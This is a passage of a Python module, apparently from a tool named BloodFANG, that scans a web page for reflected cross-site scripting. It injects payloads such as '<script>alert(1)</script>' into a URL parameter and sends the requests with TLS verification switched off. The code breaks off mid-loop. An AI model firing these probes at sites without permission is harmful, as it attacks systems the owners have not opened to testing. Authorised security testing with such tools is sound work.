# BloodFANG/core/fangxss.py
import requests, urllib.parse, time
from pathlib import Path

# === payload helper ===
PAYLOAD_DIR = Path(__file__).resolve().parent / "payloads"
def _load_payloads(name, fallback):
    file = PAYLOAD_DIR / name
    try:
        if file.exists():
            lines = [l.strip() for l in file.read_text(encoding="utf-8").splitlines()
                     if l.strip() and not l.startswith("#")]
            if lines:
                return lines
    except Exception:
        pass
    return fallback
# === end helper ===

PAYLOADS = _load_payloads("xss_payloads.txt",
    ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"])

def _compose(url, param, payload):
    p = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    q.append((param, payload))
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def scan_xss(url, param, emit, stop_event=None):
    if not param: emit("[XSS] Missing parameter."); return
    emit(f"[XSS] Target: {url} param={param}")
    for pl in PAYLOADS:
        if stop_event and stop_event.is_set(): emit("[XSS] Stopped."); return
        t = _compose(url, param, pl)
        try:
            r = requests.get(t, timeout=8, verify=False)
